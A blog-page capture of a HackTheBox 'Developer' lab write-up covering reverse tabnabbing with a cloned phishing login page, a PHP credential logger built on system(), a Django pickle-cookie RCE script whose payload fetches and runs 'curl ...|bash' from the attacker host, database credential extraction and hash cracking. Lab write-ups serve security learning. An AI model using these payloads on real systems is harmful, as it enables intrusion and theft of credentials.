@@ -1,0 +1,1308 @@
+<!DOCTYPE html><html lang="en-us" >
+
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  
+  
+  
+    <meta name="generator" content="Wowchemy 5.0.0-beta.3 for Hugo" />
+  
+
+  
+
+  
+  
+
+  
+  
+  
+  
+  
+    
+    
+    
+  
+  
+
+  <meta name="author" content="Mohamed Elleuch" />
+
+  
+  
+  
+    
+  
+  <meta name="description" content="Here&#39;s my writeup for the RETIRED machine Developer, Which is a hard Linux machine!" />
+
+  
+  <link rel="alternate" hreflang="en-us" href="https://mohamed-elleuch.me/writeups/htb-developer/" />
+
+  
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  
+
+  
+  
+  
+    <meta name="theme-color" content="#1565c0" />
+  
+
+  
+  
+
+  
+  
+  
+  
+    
+    
+      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/academicons/1.9.0/css/academicons.min.css" integrity="sha512-W4yqoT1+8NLkinBLBZko+dFB2ZbHsYLDdr50VElllRcNt2Q4/GSs6u71UHKxB7S6JEMCp5Ve4xjh3eGQl/HRvg==" crossorigin="anonymous">
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.14.0/css/all.min.css" integrity="sha256-FMvZuGapsJLjouA6k7Eo2lusoAX9i0ShlWFG6qt7SLc=" crossorigin="anonymous">
+
+    
+    
+
+    
+    
+    
+      
+    
+    
+      
+      
+        
+          <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.2.0/styles/github.min.css" crossorigin="anonymous" title="hl-light" media="print" onload="this.media='all'">
+          <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.2.0/styles/dracula.min.css" crossorigin="anonymous" title="hl-dark" media="print" onload="this.media='all'" disabled>
+        
+      
+    
+
+    
+    
+    
+      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.7.1/leaflet.min.css" integrity="sha512-1xoFisiGdy9nvho8EgXuXvnpR5GAMSjFwp40gSRE3NwdUdIMIKuPa7bqoUhLD0O/5tPNhteAsE5XyyMi5reQVA==" crossorigin="anonymous" media="print" onload="this.media='all'">
+    
+
+    
+
+    
+    
+      
+      
+
+      
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/lazysizes/5.2.2/lazysizes.min.js" integrity="sha512-TmDwFLhg3UA4ZG0Eb4MIyT1O1Mb+Oww5kFG0uHqXsdbyZz9DcvYQhKpGgNkamAI6h2lGGZq2X8ftOJvF/XjTUg==" crossorigin="anonymous" async></script>
+      
+    
+      
+      
+
+      
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+    
+      
+      
+
+      
+      
+        
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+    
+  
+
+  
+  
+  
+    
+      
+      <link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&family=Roboto+Mono&family=Roboto:wght@400;700&display=swap">
+      <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&family=Roboto+Mono&family=Roboto:wght@400;700&display=swap" media="print" onload="this.media='all'">
+    
+  
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="/css/wowchemy.a5f2a0403faf5be0213f07cb8d40527c.css" />
+
+  
+
+
+
+  
+
+  
+
+
+  
+  
+  
+
+  
+
+  
+    <link rel="manifest" href="/index.webmanifest" />
+  
+
+  <link rel="icon" type="image/png" href="/images/icon_hu69b6a0d933f031dfe27449e0ead5af37_9293_32x32_fill_lanczos_center_3.png" />
+  <link rel="apple-touch-icon" type="image/png" href="/images/icon_hu69b6a0d933f031dfe27449e0ead5af37_9293_180x180_fill_lanczos_center_3.png" />
+
+  <link rel="canonical" href="https://mohamed-elleuch.me/writeups/htb-developer/" />
+
+  
+  
+  
+  
+  
+  
+  
+    
+  
+  
+  <meta property="twitter:card" content="summary_large_image" />
+  
+  <meta property="og:site_name" content="Mohamed ELLEUCH" />
+  <meta property="og:url" content="https://mohamed-elleuch.me/writeups/htb-developer/" />
+  <meta property="og:title" content="HackTheBox - Developer Writeup | Mohamed ELLEUCH" />
+  <meta property="og:description" content="Here&#39;s my writeup for the RETIRED machine Developer, Which is a hard Linux machine!" /><meta property="og:image" content="https://mohamed-elleuch.me/writeups/htb-developer/featured.png" />
+    <meta property="twitter:image" content="https://mohamed-elleuch.me/writeups/htb-developer/featured.png" /><meta property="og:locale" content="en-us" />
+  
+    
+      <meta
+        property="article:published_time"
+        content="2022-01-15T00:00:00&#43;00:00"
+      />
+    
+    <meta property="article:modified_time" content="2021-01-15T00:00:00&#43;00:00">
+  
+
+  
+
+
+
+  
+
+  
+
+  
+
+
+
+
+
+  <title>HackTheBox - Developer Writeup | Mohamed ELLEUCH</title>
+</head>
+
+
+<body id="top" data-spy="scroll" data-offset="70" data-target="#TableOfContents" class="page-wrapper  ">
+
+  
+  
+  
+  
+  
+  
+  
+  
+  <script src="/js/wowchemy-init.min.eca9bbc7a71accd5ebd9eee0ff004132.js"></script>
+
+  
+
+
+<aside class="search-modal" id="search">
+  <div class="container">
+    <section class="search-header">
+
+      <div class="row no-gutters justify-content-between mb-3">
+        <div class="col-6">
+          <h1>Search</h1>
+        </div>
+        <div class="col-6 col-search-close">
+          <a class="js-search" href="#" aria-label="Close"><i class="fas fa-times-circle text-muted" aria-hidden="true"></i></a>
+        </div>
+      </div>
+
+      <div id="search-box">
+        
+        <input name="q" id="search-query" placeholder="Search..." autocapitalize="off"
+        autocomplete="off" autocorrect="off" spellcheck="false" type="search" class="form-control"
+        aria-label="Search...">
+        
+      </div>
+
+      
+      
+
+      
+
+    </section>
+    <section class="section-search-results">
+
+      <div id="search-hits">
+        
+      </div>
+
+    </section>
+  </div>
+</aside>
+
+
+
+  <div class="page-header">
+    
+
+
+
+
+
+
+
+
+
+
+
+
+<nav class="navbar navbar-expand-lg navbar-light compensate-for-scrollbar" id="navbar-main">
+  <div class="container-xl">
+
+    
+    <div class="d-none d-lg-inline-flex">
+      <a class="navbar-brand" href="/">Mohamed ELLEUCH</a>
+    </div>
+    
+
+    
+    <button type="button" class="navbar-toggler" data-toggle="collapse"
+            data-target="#navbar-content" aria-controls="navbar" aria-expanded="false" aria-label="Toggle navigation">
+    <span><i class="fas fa-bars"></i></span>
+    </button>
+    
+
+    
+    <div class="navbar-brand-mobile-wrapper d-inline-flex d-lg-none">
+      <a class="navbar-brand" href="/">Mohamed ELLEUCH</a>
+    </div>
+    
+
+    
+    
+    <div class="navbar-collapse main-menu-item collapse justify-content-start" id="navbar-content">
+
+      
+      <ul class="navbar-nav d-md-inline-flex">
+        
+
+        
+
+        
+        
+        
+          
+        
+
+        
+
+        
+        
+        
+        
+
+        
+          
+            
+            
+          
+          
+            
+            
+            
+              
+            
+            
+          
+        
+
+        <li class="nav-item">
+          <a class="nav-link " href="/#about"><span>Home</span></a>
+        </li>
+
+        
+        
+
+        
+
+        
+        
+        
+          
+        
+
+        
+
+        
+        
+        
+        
+
+        
+          
+            
+            
+          
+          
+            
+            
+            
+              
+            
+            
+          
+        
+
+        <li class="nav-item">
+          <a class="nav-link " href="/#posts"><span>Writeups</span></a>
+        </li>
+
+        
+        
+
+        
+
+        
+        
+        
+          
+        
+
+        
+
+        
+        
+        
+        
+
+        
+          
+            
+            
+          
+          
+            
+            
+            
+              
+            
+            
+          
+        
+
+        <li class="nav-item">
+          <a class="nav-link " href="/#contact"><span>Contact</span></a>
+        </li>
+
+        
+        
+
+      
+
+        
+      </ul>
+    </div>
+
+    <ul class="nav-icons navbar-nav flex-row ml-auto d-flex pl-md-2">
+
+      
+      
+        
+      
+
+      
+      
+      <li class="nav-item">
+        <a class="nav-link js-search" href="#" aria-label="Search"><i class="fas fa-search" aria-hidden="true"></i></a>
+      </li>
+      
+
+      
+      
+      <li class="nav-item dropdown theme-dropdown">
+        <a href="#" class="nav-link" data-toggle="dropdown" aria-haspopup="true" aria-label="Display preferences">
+          <i class="fas fa-moon" aria-hidden="true"></i>
+        </a>
+        <div class="dropdown-menu">
+          <a href="#" class="dropdown-item js-set-theme-light">
+            <span>Light</span>
+          </a>
+          <a href="#" class="dropdown-item js-set-theme-dark">
+            <span>Dark</span>
+          </a>
+          <a href="#" class="dropdown-item js-set-theme-auto">
+            <span>Automatic</span>
+          </a>
+        </div>
+      </li>
+      
+
+      
+
+    </ul>
+
+  </div>
+</nav>
+
+
+  </div>
+
+  <div class="page-body">
+    <article class="article">
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+<div class="article-container pt-3">
+  <h1>HackTheBox - Developer Writeup</h1>
+
+  
+  <p class="page-subtitle">Here&rsquo;s my writeup for the RETIRED machine Developer, Which is a hard Linux machine!</p>
+  
+
+  
+
+
+<div class="article-metadata">
+
+  
+  
+  
+  
+  <div>
+    
+
+  <span class="author-highlighted">
+      Mohamed Elleuch</span>
+  </div>
+  
+  
+
+  
+  <span class="article-date">
+    
+    
+      
+          Last updated on
+      
+    
+    Jan 15, 2021
+  </span>
+  
+
+  
+
+  
+
+  
+  
+  
+  
+  
+  
+
+  
+  
+
+</div>
+
+  
+
+
+
+
+
+</div>
+
+
+<div class="article-header container featured-image-wrapper mt-4 mb-4" style="max-width: 595px; max-height: 458px;">
+  <div style="position: relative">
+    <img src="/writeups/htb-developer/featured.png" alt="" class="featured-image">
+    <span class="article-header-caption">Image credit: [<strong>HackTheBox</strong>]</span>
+  </div>
+</div>
+
+
+
+  <div class="article-container">
+
+    <div class="article-style">
+      <h1 id="p-stylecolorredinformation-gathering-p"><p style="color:RED">Information Gathering </p></h1>
+<hr>
+<h2 id="p-stylecolorgreennmap-scan-p"><p style="color:Green">Nmap scan </p></h2>
+<pre><code class="language-bash">sudo nmap -sC -sV 10.10.11.103 -v
+</code></pre>
+<pre><code>Discovered open port 80/tcp on 10.10.11.103
+Discovered open port 22/tcp on 10.10.11.103
+</code></pre>
+<h2 id="p-stylecolorgreenweb-enumeration-p"><p style="color:Green">Web Enumeration </p></h2>
+<p>Seems like we have a CTF Platform</p>
+<img src="Pasted image 20220115060502.png">
+<p>First of all, let&rsquo;s create an account</p>
+<img src="Pasted image 20220115060642.png">
+<img src="Pasted image 20220115060942.png">
+<p>We can try to solve any of the available challenges</p>
+<img src="Pasted image 20220115061138.png">
+<p>After submitting the flag and reloading the page we&rsquo;ll have the ability to submit a walkthrough</p>
+<img src="Pasted image 20220115061242.png">
+<p>Reading the description, And our first assumption that we&rsquo;ll be dealing with an XSS (Stealing cookies?)</p>
+<img src="Pasted image 20220115061404.png">
+<p>After submitting the writeup, we can check our profile page and inspect element</p>
+<img src="Pasted image 20220115063350.png">
+<p>We have full controll over the input, we can get an XSS with this payload</p>
+<pre><code class="language-js">javascript:location=&quot;http://10.10.14.169:8000&quot;
+</code></pre>
+<img src="Pasted image 20220115061653.png">
+<p>We can also try to steal cookies or attempt a CSRF, but nothing works</p>
+<p>Another thing, is the target=&quot;_blank&quot;. An attack that exploits this vulnerability is the so-called &ldquo;reverse tabnabbing.&rdquo; It is an attack where a page linked from the target page is able to replace that page with, for example, a phishing site.</p>
+<p>So let&rsquo;s try to get the user creds</p>
+<h1 id="p-stylecolorredfoothold-p"><p style="color:RED">Foothold </p></h1>
+<p>We&rsquo;ll be doing the tabnabbing part with 2 methods</p>
+<ol>
+<li>Using The Social-Engineer Toolkit (Built-in kali)</li>
+<li>Manual phishing</li>
+</ol>
+<p>Our payload to open a new tab</p>
+<pre><code>&lt;html&gt;
+&lt;script&gt;
+if (window.opener) window.opener.parent.location.replace('http://10.10.14.169');
+if (window.parent != window) window.parent.location.replace('http://10.10.14.169');
+&lt;/script&gt;
+creds go brrr
+
+&lt;/html
+</code></pre>
+<p>Now we&rsquo;ll be using the Credentail Harvester Attack Method from setool
+And we&rsquo;ll be cloning the <code>http://developer.htb/accounts/login/</code></p>
+<p>Our phishing page is ready</p>
+<img src="Pasted image 20220115071935.png">
+<p>Let&rsquo;s host our payload as our writeup and wait until the bot hits</p>
+<img src="Pasted image 20220115072138.png">
+<p>And we get a hit with the admin credentials</p>
+<img src="Pasted image 20220115072234.png">
+<p>Now let&rsquo;s do this manually</p>
+<p>Here&rsquo;s the login fake page, basically i just changed all the links to developer.htb and making a post request to get.php</p>
+<pre><code class="language-html">&lt;!doctype html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+  &lt;head&gt;
+    &lt;meta charset=&quot;utf-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&gt;
+    &lt;meta name=&quot;description&quot; content=&quot;&quot;&gt;
+    &lt;meta name=&quot;author&quot; content=&quot;&quot;&gt;
+    &lt;link rel=&quot;icon&quot; href=&quot;http://developer.htb/img/favicon.ico&quot;&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;http://developer.htb/static/css/jquery.toasts.css&quot;&gt;
+    &lt;script src=&quot;http://developer.htb/static/js/all.min.js&quot;&gt;&lt;/script&gt;
+    &lt;script src=&quot;http://developer.htb/static/js/jquery-3.2.1.min.js&quot;&gt;&lt;/script&gt;
+    &lt;title&gt;Login | Developer.HTB&lt;/title&gt;
+
+    &lt;!-- Bootstrap core CSS --&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;http://developer.htb/static/css/bootstrap.min.css&quot;&gt;
+
+    &lt;!-- Custom styles for this template --&gt;
+    &lt;link href=&quot;http://developer.htb/static/css/signin.css&quot; rel=&quot;stylesheet&quot;&gt;
+  &lt;/head&gt;
+
+  &lt;body class=&quot;text-center&quot;&gt;
+ 
+    &lt;form class=&quot;form-signin&quot; action=&quot;get.php&quot; method=&quot;post&quot;&gt;
+    	&lt;input type=&quot;hidden&quot; name=&quot;csrfmiddlewaretoken&quot; value=&quot;EtgiMuENxtULw23q6tAJaiYTda9x78ML3O9xhInMMt31vVCLeWSAMg9KlBdNvOOT&quot;&gt;
+      &lt;img class=&quot;mb-4&quot; src=&quot;http://developer.htb/static/img/logo.png&quot; alt=&quot;&quot; width=&quot;72&quot; height=&quot;72&quot;&gt;
+      &lt;h1 class=&quot;h3 mb-3 font-weight-normal&quot;&gt;Welcome back!&lt;/h1&gt;
+      &lt;label for=&quot;uname&quot; class=&quot;sr-only&quot;&gt;User Name&lt;/label&gt;
+      &lt;input type=&quot;text&quot; id=&quot;id_login&quot; name=&quot;login&quot; placeholder=&quot;Username&quot; class=&quot;form-control&quot; required autofocus&gt;
+      &lt;label for=&quot;password&quot; class=&quot;sr-only&quot;&gt;Password&lt;/label&gt;
+      &lt;input type=&quot;password&quot; id=&quot;id_password&quot; name=&quot;password&quot; placeholder=&quot;Password&quot; class=&quot;form-control&quot; required&gt;
+
+      
+      &lt;button id=&quot;loginbtn&quot; class=&quot;btn btn-lg btn-primary btn-block&quot; type=&quot;submit&quot;&gt;Sign in&lt;/button&gt;
+          &lt;a href=&quot;http://developer.htb/accounts/password/reset/&quot; class=&quot;auth-link&quot;&gt;Forgot password?&lt;/a&gt;
+		&lt;div class=&quot;text-center mt-4 font-weight-light&quot;&gt; Don't have an account? &lt;a href=&quot;http://developer.htb/accounts/signup/&quot; &gt;Click here!&lt;/a&gt;      
+      &lt;p class=&quot;mt-5 mb-3 text-muted&quot;&gt;&amp;copy; Developer.HTB 2021&lt;/p&gt;
+    &lt;/form&gt;
+
+&lt;script src=&quot;http://developer.htb/static/js/jquery.toast.js&quot;&gt;&lt;/script&gt; 
+&lt;script&gt;
+
+
+&lt;/script&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+
+</code></pre>
+<p>For my get.php, it&rsquo;s just a very simple php script to store the creds in my local machine</p>
+<pre><code class="language-php">&lt;?php
+system('echo '.$_POST['login'].' &gt; /home/kali/phish/user');
+system('echo '.$_POST['password'].' &gt; /home/kali/phish/pass');
+?
+</code></pre>
+<p>We&rsquo;ll need to submit the writeup again and wait until it the bots hits</p>
+<img src="Pasted image 20220115072736.png">
+<img src="Pasted image 20220115072800.png">
+<p>Now we can login as admin, and access the login panel</p>
+<img src ="Pasted image 20220115075618.png">
+<p>We can check the registered users</p>
+<img src="Pasted image 20220115080058.png">
+<p>Also we can find a subdomain in the sites page</p>
+<img src="Pasted image 20220115080200.png">
+<p>We can try using the same password we got from tabnabbing with the users we got
+<img src="Pasted image 20220115080605.png"></p>
+<p><code>jacob@developer.htb:SuperSecurePassword@HTB2021</code> works</p>
+<img src="Pasted image 20220115080758.png">
+<p>Searching about sentry related vulnerabilities, This blog post seems interesting
+<a href="https://blog.scrt.ch/2018/08/24/remote-code-execution-on-a-facebook-server/" target="_blank" rel="noopener">https://blog.scrt.ch/2018/08/24/remote-code-execution-on-a-facebook-server/</a>
+Which explains how to get RCE. But we need to somehow trigger a 500 to get the secret key.</p>
+<p>We can make sure that debug is on by triggering a 404</p>
+<img src="Pasted image 20220115081755.png">
+<p>And After some enumeration, we can notice that a 500 gets triggers when we try to delete a project</p>
+<img src="Pasted image 20220115081858.png">
+<img src="Pasted image 20220115081930.png">
+<p>Searching for secret, we can find it</p>
+<img src="Pasted image 20220115082058.png">
+<p>We can now forge our cookie</p>
+<pre><code class="language-python">
+#!/usr/bin/python
+import django.core.signing, django.contrib.sessions.serializers
+from django.http import HttpResponse
+import cPickle
+import os
+
+SECRET_KEY='c7f3a64aa184b7cbb1a7cbe9cd544913'
+#Initial cookie I had on sentry when trying to reset a password
+cookie=&quot;.eJxrYKotZNQI5UxMLsksS80vSi9kimBjYGAoTs0rKaosZA5lKS5NyY_gAQqVllf6mod5l3t6uCZGcAEFSlKLS5Lz87MzU8FayvOLslNTQoXiE0tLMuJLi1OL4pMSk7NT81JClSDG6ZWWZOYU64Hk9VxzEzNzHIEsJ6gaXiR9mSnerKV6AAnPM_Q:1n8imJ:P2c5oMRqvOAwJPD3sUauC2cUvwY&quot;
+newContent =  django.core.signing.loads(cookie,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt='django.contrib.sessions.backends.signed_cookies')
+class PickleRce(object):
+    def __reduce__(self):
+        return (os.system,(&quot;curl 10.10.14.169:9005/x|bash&quot;,))
+newContent['testcookie'] = PickleRce()
+
+print django.core.signing.dumps(newContent,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt='django.contrib.sessions.backends.signed_cookies',compress=True)
+</code></pre>
+<img src="Pasted image 20220115082611.png">
+<p>We change our sentryid cookie and reload the page to a shell</p>
+<img src="Pasted image 20220115082704.png">
+<h1 id="p-stylecolorreduser-p"><p style="color:RED">User </p></h1>
+<p>Let&rsquo;s  first start by checking the sentry config</p>
+<pre><code>/etc/sentry/sentry.conf.py
+</code></pre>
+<pre><code>DATABASES = {
+    'default': {
+        'ENGINE': 'sentry.db.postgres',
+        'NAME': 'sentry',
+        'USER': 'sentry',
+        'PASSWORD': 'SentryPassword2021',
+        'HOST': 'localhost',
+        'PORT': '',
+    }S
+}
+</code></pre>
+<img src="Pasted image 20220115083353.png">
+<p>We can list databases with \list</p>
+<img src='Pasted image 20220115083506.png'>
+<p>Let&rsquo;s use sentry databse (\c sentry)</p>
+<p>and list tables</p>
+ <img src="Pasted image 20220115083606.png">
+<p>Now let&rsquo;s extract the usernames &amp; passwords</p>
+<pre><code class="language-mysql">select username,password from auth_user;
+</code></pre>
+ <img src="Pasted image 20220115083742.png">
+<pre><code>karl@developer.htb  | pbkdf2_sha256$12000$wP0L4ePlxSjD$TTeyAB7uJ9uQprnr+mgRb8ZL8othIs32aGmqahx1rGI=
+ admin@developer.ctf | pbkdf2_sha256$12000$xU0iVXVGmAV7$gy2g4hGVcbrzo8fPXLxuy0YUqsCqoJ47HPaPMaizZ8g=
+ jacob@developer.htb | pbkdf2_sha256$12000$MqrMlEjmKEQD$MeYgWqZffc6tBixWGwXX2NTf/0jIG42ofI+W3vcUKts=
+</code></pre>
+<p>Let&rsquo;s attempt to crack them</p>
+<pre><code class="language-bash">hashcat -m 10000 hash /usr/share/wordlists/rockyou.txt
+</code></pre>
+<img src="Pasted image 20220115084217.png">
+<p>And we&rsquo;re able to crack karl&rsquo;s password</p>
+<p><code>karl:insaneclownposse</code></p>
+<img src='Pasted image 20220115084336.png'>
+<h1 id="p-stylecolorredroot-p"><p style="color:RED">Root </p></h1>
+<img src="Pasted image 20220115084431.png">
+<img src="Pasted image 20220115084713.png">
+<img src="Pasted image 20220115084745.png">
+<p>Looking at the size of the binary, we can assume it&rsquo;s either rust or golang.</p>
+<p>I&rsquo;ll be transfering the binary to my windows10 and open the binary with ida</p>
+<img src="Pasted image 20220115085919.png">
+<p>Reading through, We can see that an AES-128 is being occured</p>
+<p>Where v27 is the key  and v28 is the IV</p>
+<img src="Pasted image 20220115090106.png">
+<img src="Pasted image 20220115090644.png">
+<p>Here we get both the IV And Key
+Key: a3e832345c7991619e20d43dbef4f5d5
+IV: 761F59E3D9D2959AA79855DC0620816A</p>
+<img src="Pasted image 20220115090739.png">
+<p>Now we need to find the cipher text</p>
+<img src="Pasted image 20220115090931.png">
+<p>Checking again the IDA view</p>
+<img src="Pasted image 20220115091010.png">
+CT: FE 1B 25 F0 80 6A 97 CA 78 80 FD 58 FC 5C 20 23 6C A2 DB D0 E5 02 B5 FA EB C0AF 3A 9F 27 15 2C 
+<p>Let&rsquo;s use cyberchef to decrypt it</p>
+<img src="Pasted image 20220115092506.png">
+`RustForSecurity@Developer@2021:)`
+<img src="Pasted image 20220115092610.png">
+<p>We copy  our public ssh key and ssh as root</p>
+<img src="Pasted image 20220115092813.png">
+<h2 id="thanks-for-reading-hope-you-enjoyed-it">Thanks for reading hope you enjoyed it!</h2>
+
+    </div>
+
+    
+
+
+
+
+
+
+<div class="article-tags">
+  
+  <a class="badge badge-light" href="/tag/hackthebox/">HackTheBox</a>
+  
+</div>
+
+
+
+<div class="share-box" aria-hidden="true">
+  <ul class="share">
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="https://twitter.com/intent/tweet?url=https://mohamed-elleuch.me/writeups/htb-developer/&amp;text=HackTheBox%20-%20Developer%20Writeup" target="_blank" rel="noopener" class="share-btn-twitter">
+          <i class="fab fa-twitter"></i>
+        </a>
+      </li>
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="https://www.facebook.com/sharer.php?u=https://mohamed-elleuch.me/writeups/htb-developer/&amp;t=HackTheBox%20-%20Developer%20Writeup" target="_blank" rel="noopener" class="share-btn-facebook">
+          <i class="fab fa-facebook"></i>
+        </a>
+      </li>
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="mailto:?subject=HackTheBox%20-%20Developer%20Writeup&amp;body=https://mohamed-elleuch.me/writeups/htb-developer/" target="_blank" rel="noopener" class="share-btn-email">
+          <i class="fas fa-envelope"></i>
+        </a>
+      </li>
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="https://www.linkedin.com/shareArticle?url=https://mohamed-elleuch.me/writeups/htb-developer/&amp;title=HackTheBox%20-%20Developer%20Writeup" target="_blank" rel="noopener" class="share-btn-linkedin">
+          <i class="fab fa-linkedin-in"></i>
+        </a>
+      </li>
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="whatsapp://send?text=HackTheBox%20-%20Developer%20Writeup%20https://mohamed-elleuch.me/writeups/htb-developer/" target="_blank" rel="noopener" class="share-btn-whatsapp">
+          <i class="fab fa-whatsapp"></i>
+        </a>
+      </li>
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="https://service.weibo.com/share/share.php?url=https://mohamed-elleuch.me/writeups/htb-developer/&amp;title=HackTheBox%20-%20Developer%20Writeup" target="_blank" rel="noopener" class="share-btn-weibo">
+          <i class="fab fa-weibo"></i>
+        </a>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+
+
+
+  
+  
+  
+    
+  
+  
+  
+  <div class="media author-card content-widget-hr">
+    
+      
+      <a href="https://mohamed-elleuch.me"><img class="avatar mr-3 avatar-circle" src="/authors/admin/avatar_hue00c9bb654a77b295a35ed11380f9182_580950_270x270_fill_q75_lanczos_center.jpg" alt="Mohamed Elleuch"></a>
+    
+
+    <div class="media-body">
+      <h5 class="card-title"><a href="https://mohamed-elleuch.me">Mohamed Elleuch</a></h5>
+      <h6 class="card-subtitle">Cyber Security Enthusiast <br/> ICT Engineering Student</h6>
+      <p class="card-text">Pentester and Red Teamer</p>
+      <ul class="network-icon" aria-hidden="true">
+  
+    
+    
+    
+      
+    
+    
+    
+    
+    
+      
+    
+    <li>
+      <a href="/#contact" >
+        <i class="fas fa-envelope"></i>
+      </a>
+    </li>
+  
+    
+    
+    
+      
+    
+    
+    
+    
+    
+      
+    
+    <li>
+      <a href="https://twitter.com/medelleuchv1" target="_blank" rel="noopener">
+        <i class="fab fa-twitter"></i>
+      </a>
+    </li>
+  
+    
+    
+    
+      
+    
+    
+    
+    
+    
+      
+    
+    <li>
+      <a href="https://github.com/ElleuchX1" target="_blank" rel="noopener">
+        <i class="fab fa-github"></i>
+      </a>
+    </li>
+  
+    
+    
+    
+      
+    
+    
+    
+    
+    
+      
+    
+    <li>
+      <a href="https://www.linkedin.com/in/medelleuch" target="_blank" rel="noopener">
+        <i class="fab fa-linkedin"></i>
+      </a>
+    </li>
+  
+</ul>
+
+    </div>
+  </div>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  </div>
+</article>
+  </div>
+
+  <div class="page-footer">
+    
+    
+    <div class="container">
+      <footer class="site-footer">
+  
+
+  <p class="powered-by">
+    Copyright © Mohamed Elleuch 2021
+  </p>
+
+  
+  
+
+
+
+
+
+
+  <p class="powered-by">
+    
+    
+    
+    Published with
+    <a href="https://wowchemy.com/?utm_campaign=poweredby" target="_blank" rel="noopener">Wowchemy</a>  —
+    the free, <a href="https://github.com/wowchemy/wowchemy-hugo-modules" target="_blank" rel="noopener">
+    open source</a> website builder that empowers creators.
+    
+  </p>
+</footer>
+
+    </div>
+    
+  </div>
+
+  
+<div id="modal" class="modal fade" role="dialog">
+  <div class="modal-dialog">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h5 class="modal-title">Cite</h5>
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body">
+        <pre><code class="tex hljs"></code></pre>
+      </div>
+      <div class="modal-footer">
+        <a class="btn btn-outline-primary my-1 js-copy-cite" href="#" target="_blank">
+          <i class="fas fa-copy"></i> Copy
+        </a>
+        <a class="btn btn-outline-primary my-1 js-download-cite" href="#" target="_blank">
+          <i class="fas fa-download"></i> Download
+        </a>
+        <div id="modal-error"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+      
+
+    
+    
+    
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/instant.page/5.1.0/instantpage.min.js" integrity="sha512-1+qUtKoh9XZW7j+6LhRMAyOrgSQKenQ4mluTR+cvxXjP1Z54RxZuzstR/H9kgPXQsVB8IW7DMDFUJpzLjvhGSQ==" crossorigin="anonymous"></script>
+
+      
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.imagesloaded/4.1.4/imagesloaded.pkgd.min.js" integrity="sha256-lqvxZrPLtfffUl2G/e7szqSvPBILGbwmsGE1MKlOi0Q=" crossorigin="anonymous"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.isotope/3.0.6/isotope.pkgd.min.js" integrity="sha256-CBrpuqrMhXwcLLUd5tvQ4euBHCdh7wGlDfNz8vbu/iI=" crossorigin="anonymous"></script>
+      
+
+      
+      
+
+      
+
+      
+        
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.2.0/highlight.min.js" integrity="sha512-TDKKr+IvoqZnPzc3l35hdjpHD0m+b2EC2SrLEgKDRWpxf2rFCxemkgvJ5kfU48ip+Y+m2XVKyOCD85ybtlZDmw==" crossorigin="anonymous"></script>
+        
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.2.0/languages/r.min.js"></script>
+        
+      
+
+    
+
+    
+    
+    
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.7.1/leaflet.min.js" integrity="sha512-SeiQaaDh73yrb56sTW/RgVdi/mMqNeM2oBwubFHagc5BkixSpP1fvqF47mKzPGWYSSy4RwbBunrJBQ4Co8fRWA==" crossorigin="anonymous"></script>
+    
+
+    
+    
+
+    
+    
+    
+      
+      <script id="search-hit-fuse-template" type="text/x-template">
+        <div class="search-hit" id="summary-{{key}}">
+          <div class="search-hit-content">
+            <div class="search-hit-name">
+              <a href="{{relpermalink}}">{{title}}</a>
